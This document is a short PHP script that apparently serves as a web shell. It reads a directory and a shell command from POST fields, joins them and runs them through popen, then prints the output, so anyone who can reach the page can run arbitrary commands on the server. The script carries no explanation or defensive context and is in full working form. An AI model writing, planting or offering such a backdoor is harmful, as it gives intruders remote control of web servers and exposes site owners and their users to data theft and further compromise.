<?php
if($_POST['dir'] == "") {

 $curdir = `pwd`;
} else {
 $curdir = $_POST['dir'];
}

if($_POST['king'] == "") {

 $curcmd = "ls -lah";
} else {
 $curcmd = $_POST['king'];
}


$curcmd = "cd ".$curdir.";".$curcmd;
$f=popen($curcmd,"r");
while (!feof($f)) {
    $buffer = fgets($f, 4096);
    $string .= $buffer;
}
pclose($f);
echo htmlspecialchars($string);
   
?>

